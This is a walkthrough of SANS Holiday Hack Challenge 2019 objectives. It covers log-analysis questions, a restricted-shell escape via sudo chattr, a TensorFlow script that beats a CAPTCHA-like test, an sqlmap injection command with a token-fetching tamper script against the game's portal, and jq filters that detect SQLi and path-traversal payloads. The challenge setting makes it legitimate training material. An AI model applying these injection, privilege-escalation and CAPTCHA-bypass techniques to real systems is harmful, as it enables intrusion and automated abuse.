Accept the default of +/- five seconds and click apply. Then remove the&amp;nbsp;sourcetype&amp;nbsp;search term and also remove the &amp;#8216;| reverse&amp;#8216; and re-run the search. Instead of 5 seconds, select a time window of 1 minute and look at all the events. Alice Bluebird will tell you to search for Process ID’s, but I couldn’t find anything using that method. In the area where “interesting fields” are displayed, click “All Fields” and look at the field “Process_Command_Line”. You’ll see several commands, and one of them inclues a document that is loaded by Microsoft Word, that is the answer.Training Question 5How many unique email addresses were used to send Holiday Cheer essays to Professor Banas? Please provide the numeric value. (Example: 1)Answer – 21First, search on “Holiday Cheer”, making sure you’re looking at the entire time range.Then look at the “results{}.workers.smtp.subject” field that’s associated with emails.There are 21 emails that are related to the “Holiday Cheer Assignment Submission”Training Question 6What was the password for the zip archive that contained the suspicious file?Answer – 123456789Search for the suspicious filename, which is “19th Century Holiday Cheer Assignment.docm”.Then go to the stoq event and open the dropdown pluses for the first result -&amp;gt; workers -&amp;gt; smtp.There you’ll see the email body which contains the password.Training Question 7What email address did the suspicious file come from?Answer – Bradly.Buttercups@eIfu.orgUsing the same event from the previous question, look at the “from” field. Notice the from address domain is “eIfu.org” using a capital “i”.Challenge QuestionWhat was the message for Kent that the adversary embedded in this attack?Alice Bluebird provides you with link to the event you need to look through and a link to the file archive. To solve the challenge question you have to search through the “results” for any suspicious files and open them from the file archive. It is best to craft an spath command and Alice gives an example of what that looks like.Here is the spath command that will show a list of all the files involved with the event. You can open them up one by one by copying the path and pasting in the address bar of the file archive.After traveling to the file path, you will have to go up a directory or two until you’re able to see the file download link. After downloading the file you want, just open it in a text editor to see if you have something interesting. The file with the answer is “core.xml”.Objective 7 – Get Access to the Steam Tunnels Gain access to the steam tunnels. Who took the turtle doves? Please tell us their first and last name. _For hints on achieving this objective, please visit Minty’s dorm room and talk with Minty Candy Cane. Answer: Krampus Hollyfeld This Objective requires some exploration. You’ll have to get into the locked closet inside of Minty Candycane’s dorm room.Dorm PinPadThe first thing to do is get access to the Dorm area by cracking the pinpad code that’s at the right hand side of the Quad.You can get a hint from the elf near it, Tangle Coalbox. He says: Hey kid, it&amp;#8217;s me, Tangle Coalbox.I&amp;#8217;m sleuthing again, and I could use your help.Ya see, this here number lock&amp;#8217;s been popped by someone.I think I know who, but it&amp;#8217;d sure be great if you could open this up for me.I&amp;#8217;ve got a few clues for you.1. One digit is repeated once.2. The code is a prime number.3. You can probably tell by looking at the keypad which buttons are used. Tangle CoalboxOn the keypad, you can see three numbers that are used because there is less frost on them.Tangle said one of the numbers is repeated, and the code is a prime number.After a few tries you should be able to crack it. Answer &amp;#8211; 7331 Terminal Challenge – Holiday Hack TrailMinty Candycane gives a hint to get into the closet in her room, but first you have to hack the game in her terminal challenge.The tool I prefer for this job is BurpSuite, but you could use another HTTP filter proxy or browser addon that can modify headers and data.Start the game and play around to see how it works, while watching the requests in Burp.Easy ModeTo solve Easy Mode, you can modify variables in the url at the top of the game screen after you’re out of the store. One way to do it is modify “distance” to 8000 then press “GO”.Medium ModeIn the Medium Mode, all of the variables were moved from the URL into POST data, which you can see in Burp. Use the Repeater tab to modify a variable, then press Send.Hard ModeIn the POST variables on Hard mode, there is a “hash” value that has to be right or the game will give an error.For a strong clue, watch the talk Web Apps: A Trailhead. The algorithm is leaked about mid-way through the video. Not everything is seen perfectly, but you can sort out that the hash is adding the numeric values of variables together in a string and running “md5it” to get it’s md5 hash value. To find out exactly which variables are being put together simply change values and see which ones cause errors.The variables used are:moneydistancecurdaycurmonthreindeerrunnersammomedsfoodAdd the values together that you want to send and use an online MD5 generator to get the hash value.Hint You made it &amp;#8211; congrats!Have you played with the key grinder in my room? Check it out!It turns out: if you have a good image of a key, you can physically copy it.Maybe you&amp;#8217;ll see someone hopping around with a key here on campus.Sometimes you can find it in the Network tab of the browser console.Deviant has a great talk on it at this year&amp;#8217;s Con.He even has a collection of key bitting templates for common vendors like Kwikset, Schlage, and Yale. Minty CandycaneThe hint Minty gives is regarding a key making machine in her room. And mentions looking for a person with a key by monitoring the Network tab in the browser’s developer tools.When you walk into her room, you’ll see a guy hurry into the closet and shut the door behind him. And if your Network tab is open, it will record the download for his image file. The guy’s name is Krampus, and the key is very clearly visible.In the room, there is a key grinder on the desk that allows you to click on it and make a key. Click the key to download an image of it.When you go into the closet you see a keyhole on the back wall that you can click on. It will open a closeup view of the lock with a group of keys hanging up. Click on the keys to load your own key image that was saved from the grinder.There is a talk that will help figure out the key’s biting code called “Optical Decoding of Keys“. It has some general info about the issue, and after watching that talk you should be able to figure out the code on Krampus’s key by looking closely at the picture and guessing the values. Then input your guess into the key grinder to save your own copy of the key to use in the secret door. Answer: 122520 Steam TunnelsOpening the secret door at the back of the closet goes to the steam tunnels. Walk through the tunnel to the end to meet and talk to Krampus. Here you find out that he was actually the one who took the Turtle Doves! Hello there! I’m Krampus Hollyfeld.I maintain the steam tunnels underneath Elf U,Keeping all the elves warm and jolly.Though I spend my time in the tunnels and smoke,In this whole wide world, there&amp;#8217;s no happier bloke!Yes, I borrowed Santa’s turtle doves for just a bit.Someone left some scraps of paper near that fireplace, which is a big fire hazard.I sent the turtle doves to fetch the paper scraps.But, before I can tell you more, I need to know that I can trust you.Tell you what – if you can help me beat the Frido Sleigh contest (Objective 8), then I&amp;#8217;ll know I can trust you.The contest is here on my screen and at fridosleigh.com.No purchase necessary, enter as often as you want, so I am!They set up the rules, and lately, I have come to realize that I have certain materialistic, cookie needs.Unfortunately, it&amp;#8217;s restricted to elves only, and I can&amp;#8217;t bypass the CAPTEHA.(That&amp;#8217;s Completely Automated Public Turing test to tell Elves and Humans Apart.)I&amp;#8217;ve already cataloged 12,000 images and decoded the API interface.Can you help me bypass the CAPTEHA and submit lots of entries? Krampus HollyfeldSolving this Objective unlocks the rest of the Objectives, and you’ll get a new tab to your badge that allows you to fast travel through the steam tunnels.Objective 8 – Bypassing the Frido Sleigh CAPTEHA Help Krampus beat the Frido Sleigh contest. _For hints on achieving this objective, please talk with Alabaster Snowball in the Speaker Unpreparedness Room. Answer: 8Ia8LiZEwvyZr2WO This Objective was given by Krampus to help him win the Frido Sleigh competition by circumventing the custom captcha system called CAPTEHA ( Completely Automated Public Turing test to tell Elves and Humans Apart). Krampus provides some code to start with that uses an API interface to the competition. He also provides 12,000 images he’s saved to use with a machine learning algorithm for the solution.When you fill in the info fields and check the CAPTEHA box it presents the challenge image and gives you only 5 seconds to complete it or else it determines you’re not an elf and exits.To inspect this screen a little closer, you can use the Developer Tools Console in your browser, and enter this code to change the timeout value:$(&#39;#timer&#39;).text(&#39;9000&#39;)Even with the timer set to something ridiculous, you can select all the proper images, but still not be able to pass the challenge.To get a hint on how to use machine learning to break the CAPTEHA, talk to Alabaster Snowball in the Speaker Unpreparedness Room, which is in the Hermey Hall area of campus.Terminal Challenge – Nyanshell Welcome to the Speaker UNpreparedness Room!My name&amp;#8217;s Alabaster Snowball and I could use a hand.I&amp;#8217;m trying to log into this terminal, but something&amp;#8217;s gone horribly wrong.Every time I try to log in, I get accosted with … a hatted cat and a toaster pastry?I thought my shell was Bash, not flying feline.When I try to overwrite it with something else, I get permission errors.Have you heard any chatter about immutable files? And what is sudo -l telling me? Alabaster SnowballHelp Alabaster break out of the limited shell in the terminal challenge. The banner text says to log into a bash shell as “alabaster_snowball”.When trying to use the command “su” to get into alabaster’s account, you will be greated with a holiday nyancat!Dumping “/etc/passwd” shows that alabaster’s shell is set to “/bin/nsh”.elf@2e974b2f04ac:~$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinelf:x:1000:1000::/home/elf:/bin/bashalabaster_snowball:x:1001:1001::/home/alabaster_snowball:/bin/nshIf you try to use “chsh” to change alabaster’s shell the normal way if fails for some reason. So we have to replace “nsh” with “bash” to get the right shell in place.Alabaster gives a hint about immutable files when talking to him, and “nsh” is indeed one of them. To verify, use the command lsattr /bin/nsh. However, upon Alabaster’s other hint about sudo -l, you’ll see that you have access to chattr.elf@2e974b2f04ac:~$ sudo -lMatching Defaults entries for elf on 2e974b2f04ac: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser elf may run the following commands on 2e974b2f04ac: (root) NOPASSWD: /usr/bin/chattrUse chattr to modify nsh, and then copy bash into it.sudo chattr -i /bin/nsh; cp /bin/bash /bin/nshUse su to log in as alabaster_snowball and you’ll beat the challenge.Hint Who would do such a thing?? Well, it IS a good looking cat. Have you heard about the Frido Sleigh contest? There are some serious prizes up for grabs. The content is strictly for elves. Only elves can pass the CAPTEHA challenge required to enter. I heard there was a talk at KCII about using machine learning to defeat challenges like this. I don&amp;#8217;t think anything could ever beat an elf though! Alabaster SnowballYou’ll get a Hint in your badge from Alabaster called “Machine Learning” that gives a link to a talk Machine Learning Use Cases for Cyber Security In the video you’ll see the URL to some demo code to that helps to use ML with TensorFlow. It provides a script that trains a model with given images and also code to run against the model.SolutionThe “capteha_api” code that Krampus provides has a section in the middle that says “MISSING IMAGE PROCESSING AND ML IMAGE PREDICTION CODE GOES HERE”. TensorFlow code can go there, however after I got the code working it would not complete fast enough to pass the challenge. It would instead return with a “Timed Out” error.That seemed to be a lot of people’s hang up with this Objective. There are probably many ways to fix that, but my way was to rearrange the code from the TensorFlow demo.The idea is to do as much of the processing as possible BEFORE creating the web session to Frido Sleigh. There seemed to be a long pause at the start of loading the model before any checking occured. So put the code that loads the TensorFlow model and session above the “requests.Session()” call and image checking loop.The main() function could look something like this:def main(): yourREALemailAddress = &quot;dwatts.comptech@gmail.com&quot; # Loading the Trained Machine Learning Model created from running retrain.py on the training_images directory graph = load_graph(&#39;/tmp/retrain_tmp/output_graph.pb&#39;) labels = load_labels(&quot;/tmp/retrain_tmp/output_labels.txt&quot;) # Load up our session input_operation = graph.get_operation_by_name(&quot;import/Placeholder&quot;) output_operation = graph.get_operation_by_name(&quot;import/final_result&quot;) sess = tf.compat.v1.Session(graph=graph) # Can use queues and threading to spead up the processing q = queue.Queue() # Creating a session to handle cookies s = requests.Session() url = &quot;https://fridosleigh.com/&quot; json_resp = json.loads(s.get(&quot;{}api/capteha/request&quot;.format(url)).text) unknown_images = json_resp[&#39;images&#39;] # A list of dictionaries eaching containing the keys &#39;base64&#39; and &#39;uuid&#39; challenge_image_type = json_resp[&#39;select_type&#39;].split(&#39;,&#39;) # The Image types the CAPTEHA Challenge is looking for. challenge_image_types = [challenge_image_type[0].strip(), challenge_image_type[1].strip(), challenge_image_type[2].replace(&#39; and &#39;,&#39;&#39;).strip()] # cleaning and formatting #Going to interate over each of our images. for image in unknown_images: image_bytes = b64decode(image[&#39;base64&#39;]) image_uuid = image[&#39;uuid&#39;] # We don&#39;t want to process too many images at once. 10 threads max while len(threading.enumerate()) &amp;gt; 10: time.sleep(0.0001) #predict_image function is expecting png image bytes so we read image as &#39;rb&#39; to get a bytes object threading.Thread(target=predict_image, args=(q, sess, graph, image_bytes, image_uuid, labels, input_operation, output_operation)).start() print(&#39;Waiting For Threads to Finish...&#39;) while q.qsize() &amp;lt; len(unknown_images): time.sleep(0.001) #getting a list of all threads returned results prediction_results = [q.get() for x in range(q.qsize())] # This should be JUST a csv list image uuids ML predicted to match the challenge_image_type . final_answer = &#39;,&#39;.join( [ prediction[&#39;image_uuid&#39;] for prediction in prediction_results if prediction[&#39;prediction&#39;] in challenge_image_types ] )After running the time-optimized code, you’ll win the contest and you’ll receive an email with the Objective solution inside....Submitting lots of entries until we win the contest! Entry #104Submitting lots of entries until we win the contest! Entry #105Submitting lots of entries until we win the contest! Entry #106Submitting lots of entries until we win the contest! Entry #107Submitting lots of entries until we win the contest! Entry #108{&quot;data&quot;:&quot;&amp;lt;h2 id=\\&quot;result_header\\&quot;&amp;gt; Entries for email address #################### no longer accepted as our systems show your email was already randomly selected as a winner! Go check your email to get your winning code. Please allow up to 3-5 minutes for the email to arrive in your inbox or check your spam filter settings. &amp;lt;br&amp;gt;&amp;lt;br&amp;gt; Congratulations and Happy Holidays!&amp;lt;/h2&amp;gt;&quot;,&quot;request&quot;:true}Objective 9 – Retrieve Scraps of Paper from Server Gain access to the data on the Student Portal server and retrieve the paper scraps hosted there. What is the name of Santa’s cutting-edge sleigh guidance system? _For hints on achieving this objective, please visit the dorm and talk with Pepper Minstix. Answer: Super Sled-o-matic The Elf University Student Portal is a site where you can submit an application for enrollment and check it’s status. To get a hint for the Student Portal, go to Pepper Minstix and do the Graylog Terminal Challenge.Terminal Challenge – GraylogThis challenge is to analyze event data with Graylog and fill out all the questions in the Incident Report. Find the Report by mouse-over in the bottom right corner of the Graylog window.To figure out what Event ID’s are in order to search on them, look up Sysmon EventID.Question 1:Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file.What is the full-path + filename of the first malicious file downloaded by Minty?Answer 1: C:\\Users\\minty\\Downloads\\cookie_recipe.exe Search with the regular expression /.*cookie.*/ to get the answer. Be sure to search in all messages.Question 2:The malicious file downloaded and executed by Minty gave the attacker remote access to his machine. What was the ip:port the malicious file connected to first?Answer 2: 192.168.247.175:4444 You could follow the events found from the first question in sequence, or you could search on the Network Connection EventID 3 and look at the first one with “/.*cookie.*/ AND EventID:3”Question 3:What was the first command executed by the attacker?Answer 3: whoami Search within the cookie results for EventID:1 and look for commands being entered with “/.cookie./ AND EventID:1″Question 4:What is the one-word service name the attacker used to escalate privileges?Answer 4: webexservice Click on the “userAccount” in the field list to the left in order to quickly read what the user account is for the commands found previously. Most of the commands are under “minty”, and inspect what happens when they change to no longer showing a user.Question 5:What is the file-path + filename of the binary ran by the attacker to dump credentials?Answer 5: C:\\cookie.exe A fast way to inspect the commands is to use the field list on the left and click on the “CommandLine” box. Commands will then show above the details so you can quickly follow through what happened. Shortly above the privilege escalation there were calls to download “mimikatz.exe”, which is known for dumping credentials. The file is saved as “cookie.zip” first, and then again as “C:\\cookie.exe”, which is then executed.Question 6:The attacker pivoted to another workstation using credentials gained from Minty’s computer. Which account name was used to pivot to another machine?Answer 6: alabaster Pivot on time by going to the last event in the previous results, which has a command of cmd \\c exit. Click on “Show surrounding messages” button and select 1 minute. Within these results search for network connections from the attacker’s address “192.168.247.175”. All four of them are using “alabaster” as the account.Question 7:What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to another machine?Answer 7: 06:04:28 Look up logon events and find the Remote Desktop Connection type. The logon type needed is 10, so search “LogonType:10” in all messages. Only one of the results has __a Windows Event ID 4624 , grab it’s time and that’s the answer.Question 8:The attacker navigates the file system of a third host using their Remote Desktop Connection to the second host. What is the SourceHostName,DestinationHostname,LogonType of this connection?Answer 8: elfu-res-wks2,elfu-res-wks3,3 Search for network logons with “EventID:4624 AND LogonType:3”, then look through the listing for connections from the computer “elfu-res-wks2”, where the RDP connection was on.Question 9:What is the full-path + filename of the secret research document after being transferred from the third host to the second host?Answer 9: C:\\Users\\alabaster\\Desktop\\super_secret_elfu_research.pdf Search for files created on the second computer with “EventID:2 AND source:elfu-res-wks2”. In the displayed field list, only select Message and TargetFilename in order to quickly see what was downloaded. Look through the listing and you’ll see an interesting PDF.Question 10:What is the IPv4 address (as found in logs) the secret research document was exfiltrated to?Answer 10: 104.22.3.84 Search on the filename and you’ll see there was a command to upload it to “pastebin.com”. Show surrounding messages for just 1 second from that event, and you’ll see a network connection made to pastebin.com with the IP address listed.Hint That&amp;#8217;s it &amp;#8211; hooray!Have you had any luck retrieving scraps of paper from the Elf U server?You might want to look into SQL injection techniques.OWASP is always a good resource for web attacks.For blind SQLi, I&amp;#8217;ve heard Sqlmap is a great tool.In certain circumstances though, you need custom tamper scripts to get things going! Alabaster SnowballHis hint basically shows that you have to do SQL injection to solve this Objective. Alabaster also lets us know that tamper scripts with Sqlmap is useful for this.SolutionThere are two pages in the Student Portal that are vulnerable to SQL injection. The “Apply Now” page where you submit your application uses a POST request with several variables, and the “Check Application Status” page uses a simple GET request. Both pages are viable to solve the the Objective. I used the GET request since it won’t create new records in the database. Of course you have to create an application to check against or it’ll return “No application found”.SQL Commandsqlmap -u &quot;https://studentportal.elfu.org/application-check.php?elfmail=elfelif@nowhere.net*&quot; --tamper=&quot;hhctamper.py&quot; --skip-urlencode -v2 -o --prefix=&quot;&#39;&quot; --suffix=&quot; -- &quot; -D &quot;elfu&quot;There is an authentication token that expires too quickly to use in a command like this, since you have to first generate the token with a request to “validator.php” and by the time you can type it into a sqlmap command it’s already expired. That’s where the hint about tamper scripts comes in. Use Sqlmap’s tamper script functionality and make a call to get the token before using the returned data in the call to “application-check.php”.Tamper Script#!/usr/bin/pythonimport base64import urllibimport requestsdef tamper(payload, **kwargs): token = requests.get(&quot;https://studentportal.elfu.org/validator.php&quot;).text data = payload + &quot;&amp;amp;token=&quot; + token return dataDatabaseThe database to dump is “elfu” and it has three user tables, “applications”, “students”, and “krampus”. The “applications” table is way too large to dump as it holds attempts from thousands of people at the convention, so skip dumping that one with Ctrl-C at the time. The “krampus” table is what holds the scraps of paper.Table: krampus [6 entries] +----+-----------------------+ | id | path | +----+-----------------------+ | 1 | /krampus/0f5f510e.png | | 2 | /krampus/1cc7e121.png | | 3 | /krampus/439f15e6.png | | 4 | /krampus/667d6896.png | | 5 | /krampus/adb798ca.png | | 6 | /krampus/ba417715.png | +----+-----------------------+Paper ScrapsAfter you download all the images found, you’ll need to piece them together like a jigsaw puzzle and figure out what the original letter said. It could look something like this:After you study it a little bit, you’ll piece out what the text says, where you’ll find the name of Santa’s sleigh guidance system to answer the Objective.From the Desk of ---Date: August 23, 2019Memo to Self:Finally! I&#39;ve figured out how to destroy Christmas!Santa has a brand new, cutting edge sleigh guidancetechnology, call the Super Sled-o-matic.I&#39;ve figured out a way to poison the data going into the system so that it will divert Santa&#39;s sled on ChristmasEve!Santa will be unable to make the trip and the holidayseason will be destroyed! Santa&#39;s own technology will undermine him!That&#39;s what they deserve for not listening to mysuggestions for supporting other holiday characters!Bwahahahahaha!Objective 10 – Recover Cleartext Document The Elfscrow Crypto tool is a vital asset used at Elf University for encrypting SUPER SECRET documents. We can’t send you the source, but we do have debug symbols that you can use. Recover the plaintext content for this encrypted document. We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC.  What is the middle line on the cover page? (Hint: it’s five words) _For hints on achieving this objective, please visit the NetWars room and talk with Holly Evergreen. Answer: Machine Learning Sleigh Route Finder Objective 11 – Open the Sleigh Shop Door Visit Shinny Upatree in the Student Union and help solve their problem. What is written on the paper you retrieve for Shinny?For hints on achieving this objective, please visit the Student Union and talk with Kent Tinseltooth. Answer: The Tooth Fairy For this Objective, you have to go to the Student Union and find the Sleigh Shop in the corner. An elf named Shinny Upatree stands there, and at this point in the game there will be a crate also. Shinny claims to have written down the name of the attacker and put it in this crate, but it’s only opened by solving his riddles. Psst &amp;#8211; hey!I&amp;#8217;m Shinny Upatree, and I know what&amp;#8217;s going on!Yeah, that&amp;#8217;s right &amp;#8211; guarding the sleigh shop has made me privvy to some serious, high-level intel.In fact, I know WHO is causing all the trouble.Cindy? Oh no no, not that who. And stop guessing &amp;#8211; you&amp;#8217;ll never figure it out.The only way you could would be if you could break into my crate, here.You see, I&amp;#8217;ve written the villain&amp;#8217;s name down on a piece of paper and hidden it away securely! Shinny UpatreeRiddle 1 You don&amp;#8217;t need a clever riddle to open the console and scroll a little. Follow the instructions and open the developer’s console to see the unlock code. Then enter it into the lock image, and press “UNLOCK”. The light will turn red once that code is accepted.Riddle 2 Some codes are hard to spy, perhaps they&amp;#8217;ll show up on pulp with dye? This riddle is referring to print on paper, so look into the “Print Preview” to see the code.Riddle 3 This code is still unknown; it was fetched but never shown. Open Network in the Developer Tools and see what’s loaded but never shown. Might have to reload the page to capture the traffic.Riddle 4 Where might we keep the things we forage? Yes, of course: Local barrels! Find this one in the Local Storage tab of Developer’s Console.Riddle 5 Did you notice the code in the title? It may very well prove vital. Look at the title in the HTML Elements Tab.Riddle 6 n order for this hologram to be effective, it may be necessary to increase your perspective. Delete the “perspective” CSS element.Then you’ll see a code in the rainbow box. Type it in as shown.Riddle 7 The font you&amp;#8217;re seeing is pretty slick, but this lock&amp;#8217;s code was my first pick. Find the font-family property in the HTML head.&amp;gt;Riddle 8 In the event that the&amp;nbsp;.eggs&amp;nbsp;go bad, you must figure out who will be sad. Search for “eggs” in the HTML for an element with a class of “eggs”. Highlight the found element and look at its “Event Listeners”. There is a listener for “spoil” and the handler makes assigns ‘VERONICA = sad’. Type in VERONICA.Riddle 9 This&amp;nbsp;next&amp;nbsp;code will be&amp;nbsp;unredacted, but&amp;nbsp;only&amp;nbsp;when&amp;nbsp;all the&amp;nbsp;chakras&amp;nbsp;are&amp;nbsp;:active. Search for “chakra” in the HTML to find 5 words with the “chakra” class. Force each word to be in an “:active” state and sections of the code will appear. You can also just read the code sections in the CSS by searching for “chakra”.Riddle 10 Oh, no! This lock&amp;#8217;s out of commission! Pop off the cover and locate what&amp;#8217;s missing. First, remove the cover image by modifying a CSS property for ‘cover’.Next, you have to find three components that are defined in the CSS, and put them on the circuit board.Discover where they are in the HTML by searching for “component”. You can then drag the HTML element down to the lock area. That will allow you to enter the code and push the button.Find the lock’s code written on the circuit board.The NoteAfter solving entering the code in for all of the locks, the note will appear with the answer on it.Terminal Challenge – Smart Braces OK, this is starting to freak me out!Oh sorry, I&amp;#8217;m Kent Tinseltooth. My Smart Braces are acting up.Do… Do you ever get the feeling you can hear things? Like, voices?I know, I sound crazy, but ever since I got these… Oh!Do you think you could take a look at my Smart Braces terminal?I&amp;#8217;ll bet you can keep other students out of my head, so to speak.It might just take a bit of Iptables work. Kent TinseltoothOpening this terminal slowly shows dialog text between Kent Tinseltooth and someone named “Inner Voice”.Read the file in the home directory, “IOTteethBraces.md” to find out what to do next. Due to questions about who the “Inner Voice” actually was, Kent wants to further secure the device by configuring the firewall to harden it.There are 6 rules that need to be applied with “iptables“: Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains. Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains. Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22). Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80. Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80. Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface.And here are commands to use for inputting them in relative order: elfuuser@25f4a0a345d9:~$ sudo iptables -P FORWARD DROPelfuuser@25f4a0a345d9:~$ sudo iptables -P OUTPUT DROPelfuuser@25f4a0a345d9:~$ sudo iptables -P INPUT DROP sudo iptables -A INPUT -m conntrack –ctstate ESTABLISHED,RELATED -j ACCEPTsudo iptables -A OUTPUT -m conntrack –ctstate ESTABLISHED,RELATED -j ACCEPT sudo iptables -A INPUT -p tcp -s 172.19.0.225 –dport 22 -m conntrack –ctstate NEW,ESTABLISHED -j ACCEPT sudo iptables -A INPUT -p tcp –dport 21 -m conntrack –ctstate NEW,ESTABLISHED -j ACCEPTsudo iptables -A INPUT -p tcp –dport 80 -m conntrack –ctstate NEW,ESTABLISHED -j ACCEPT sudo iptables -A OUTPUT -p tcp –dport 80 -m conntrack –ctstate NEW,ESTABLISHED -j ACCEPT sudo iptables -A INPUT -i lo -j ACCEPTHintOh thank you! It’s so nice to be back in my own head again. Er, alone.By the way, have you tried to get into the crate in the Student Union? It has an interesting set of locks.There are funny rhymes, references to perspective, and odd mentions of eggs!And if you think the stuff in your browser looks strange, you should see the page source…Special tools? No, I don’t think you’ll need any extra tooling for those locks.BUT – I’m pretty sure you’ll need to use Chrome’s developer tools for that one.Or sorry, you’re a Firefox fan?Yeah, Safari’s fine too – I just have an ineffible hunger for a physical Esc key.Edge? That’s cool. Hm? No no, I was thinking of an unrelated thing.Curl fan? Right on! Just remember: the Windows one doesn’t like double quotes.Old school, huh? Oh sure – I’ve got what you need right here…The Tooth Fairy and Sleigh Shop I’m the Tooth Fairy, the mastermind behind the plot to destroy the holiday season.I hate how Santa is so beloved, but only works one day per year!He has all of the resources of the North Pole and the elves to help him too.I run a solo operation, toiling year-round collecting deciduous bicuspids and more from children.But I get nowhere near the gratitude that Santa gets. He needs to share his holiday resources with the rest of us!But, although you found me, you haven’t foiled my plot!Santa’s sleigh will NOT be able to find its way.I will get my revenge and respect!I want my own holiday, National Tooth Fairy Day, to be the most popular holiday on the calendar!!! Tooth FairyUpon entering the Sleigh Shop, you’ll see the mastermind Tooth Fairy and can find out why she sabotaged Christmas. Also you get access to the sleigh guidance system.Objective 12 – Filter Out Poisoned Sources of Weather Data Use the data supplied in the Zeek JSON logs to identify the IP addresses of attackers poisoning Santa’s flight mapping software. Block the 100 offending sources of information to guide Santa’s sleigh through the attack. Submit the Route ID (“RID”) success value that you’re given. _For hints on achieving this objective, please visit the Sleigh Shop and talk with Wunorse Openslae.Clicking on the computer for the Sleigh Route Finder opens your browser to their guidance app. Credentials given earlier do nothing with this system, so you have to find the proper login to get further. Also, there are hints to get from Wunorse Openslae by his Terminal Challenge.Terminal Challenge – Zeek JSON Analysis Wunorse Openslae here, just looking at some Zeek logs.I&amp;#8217;m pretty sure one of these connections is a malicious C2 channel&amp;#8230;Do you think you could take a look?I hear a lot of C2 channels have very long connection times.Please use jq to find the longest connection in this data set.We have to kick out any and all grinchy activity! Wunorse OpenslaeAll you have to do is use jq -s &#39;max_by(.duration)&#39; conn.log to get the maximum and answer the question with the resp_h address.{ &quot;ts&quot;: &quot;2019-04-18T21:27:45.402479Z&quot;, &quot;uid&quot;: &quot;CmYAZn10sInxVD5WWd&quot;, &quot;id.orig_h&quot;: &quot;192.168.52.132&quot;, &quot;id.orig_p&quot;: 8, &quot;id.resp_h&quot;: &quot;13.107.21.200&quot;, &quot;id.resp_p&quot;: 0, &quot;proto&quot;: &quot;icmp&quot;, &quot;duration&quot;: 1019365.337758, &quot;orig_bytes&quot;: 30781920, &quot;resp_bytes&quot;: 30382240, &quot;conn_state&quot;: &quot;OTH&quot;, &quot;missed_bytes&quot;: 0, &quot;orig_pkts&quot;: 961935, &quot;orig_ip_bytes&quot;: 57716100, &quot;resp_pkts&quot;: 949445, &quot;resp_ip_bytes&quot;: 56966700}Post Dialogue with Hints That’s got to be the one - thanks!Hey, you know what? We’ve got a crisis here.You see, Santa’s flight route is planned by a complex set of machine learning algorithms which use available weather data.All the weather stations are reporting severe weather to Santa’s Sleigh. I think someone might be forging intentionally false weather data!I’m so flummoxed I can’t even remember how to login!Hmm… Maybe the Zeek http.log could help us.I worry about LFI, XSS, and SQLi in the Zeek log - oh my!And I’d be shocked if there weren’t some shell stuff in there too.I’ll bet if you pick through, you can find some naughty data from naughty hosts and block it in the firewall.If you find a log entry that definitely looks bad, try pivoting off other unusual attributes in that entry to find more bad IPs.The sleigh’s machine learning device (SRF) needs most of the malicious IPs blocked in order to calculate a good route.Try not to block many legitimate weather station IPs as that could also cause route calculation failure.Remember, when looking at JSON data, jq is the tool for you!Sleigh Route Finder ApplicationThe computer in the sleigh room brings up the Sleigh Route Finder flight mapping app. The login is not provided so it will have to be discovered. Then use the hints gathered for solving Objective 12 within this app.Login CredentialsThere were some hints given about the login system: Kent Tinseltooth mentioned this system uses default credentials This is the system pictured in the encrypted PDF from Objective 10 The PDF mentions the default credentials are in a ElfU Research Labs git repositoryWith the above hints you know to look for default creds that are found in a git repo. The ‘http.log’ file given in the Objective Description has captured traffic from the mentioned git repo. Find the traffic with cat http.log | jq &#39;.[]&#39; | grep -i &#39;readme&#39;. Then go to the address found and you’ll find the creds.Hints gathered from Wunorse Openslae App is based on ML algorithms that consume weather data Weather stations are sending bad data to corrupt the algorithm Use the ‘http.log’ file Look for Local File Includes Look for Cross Site Scripting Look for SQL injection Look for Shell Shock Exploits Block IP addresses from events found Pivoting will be involved Only most of the bad IPs need to be found (there are 100 according to Objective Description) Use ‘jq’SQL InjectionThere are 29 SQLi events to find. Use these commands and note the originating host address: cat http.log | jq &#39;.[] | select(. | tostring | match(&quot;SELECT&quot;))&#39; cat http.log | jq &#39;.[] | select(.username | contains(&quot;1=1&quot;))&#39; cat http.log | jq &#39;.[] | select(.user_agent | tostring | match(&quot;SELECT&quot;))&#39; cat http.log | jq &#39;.[] | select(.uri | tostring | match(&quot;SELECT&quot;))&#39;Local File IncludesThere are 11 events to find for LFI. cat http.log | jq &#39;.[] | select(. | tostring | contains(&quot;../..&quot;))&#39; cat http.log | jq &#39;.[] | select(. | tostring | contains(&quot;.|./.|.&quot;))&#39; cat http.log | jq &#39;.[] | select(. | tostring | contains(&quot;.%2e/.%2e&quot;))&#39; cat http.log | jq &#39;.[] | select(. | tostring | contains(&quot;/etc/passwd&quot;))&#39;Cross Site ScriptingThere are 16 